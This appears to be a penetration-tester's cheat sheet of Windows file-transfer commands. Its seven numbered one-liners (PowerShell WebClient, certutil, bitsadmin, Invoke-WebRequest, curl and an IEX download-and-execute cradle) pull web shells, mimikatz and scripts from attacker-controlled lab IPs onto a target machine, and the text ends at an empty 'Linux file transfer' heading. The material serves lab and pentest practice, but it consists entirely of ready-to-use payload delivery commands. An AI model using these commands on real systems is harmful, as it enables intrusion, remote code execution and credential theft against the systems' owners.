Windows file transfer:
1. powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.11:8000/shell.php', 'shell.php')
2. certutil.exe -urlcache -f http://192.168.119.138/mimikatz.exe C:\Users\mimikatz.exe
3. bitsamin /transfer pwn /download http://192.168.119.138/sc.exe C:\sc.exe   ## For win XP
4. powershell.exe $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest 'http://10.10.14.11:8000/shell.ps1' -OutFile shell.ps1
5. curl <attacker_ip/filename> -o <target path>
6. powershell.exe wget <attacker_ip/filename> -o <target path>
7. powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.../file.ps1')  ## download and execute 
  
  
Linux file transfer:
